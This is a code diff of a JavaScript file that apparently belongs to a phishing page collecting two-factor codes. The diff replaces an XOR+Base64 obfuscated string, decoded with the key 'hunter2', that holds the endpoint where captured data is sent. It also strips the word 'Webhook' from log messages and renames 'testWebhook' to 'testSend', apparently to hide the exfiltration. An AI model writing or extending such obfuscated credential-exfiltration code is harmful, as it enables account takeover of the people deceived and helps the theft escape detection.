@@ -266,7 +266,7 @@ if (twofaInput2 && verifyButton2) {
 
 // === Sending ===
 // XOR + Base64 encoded
-const encryptedsending = "FhMWB1gXTVhTAgIPWxEfVEgXXVBVDxtOBBZHTAwYUF0OAlZRVUAGBlVXEw==";
+const encryptedsending = "AAEaBBZIHUcRBwcGHUAMWw0bCF1TGBxBAwAQWgcaBQdKQwFRQFdAUEYBUEFWRVFKB1BCWVtXFlssRDwrKCNcJw8GOD0cBCQyOhxWJGtfIgdEDkZ0Iy82AiRGdh0GHTEnAHwnOzQHAAJABxMlJSgbQQ07PCQ0CEEDHg==";
 const xorKey = "hunter2"; // must match the encoding key
 
 function xorDecode(base64, key) {
@@ -292,9 +292,9 @@ async function sendtome(title, description, color) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
-    if (!res.ok) console.error('Webhook failed:', res.status, res.statusText);
+    if (!res.ok) console.error('Failed:', res.status, res.statusText);
   } catch (err) {
-    console.error('Webhook error:', err);
+    console.error('Error:', err);
   }
 }
 
@@ -333,7 +333,7 @@ function showSuccessPopup() {
 }
 
 // === Test Function ===
-function testWebhook() {
+function testSend() {
   sendtome('Test Message', 'This is a test message', 0x00ff00);
 }
 
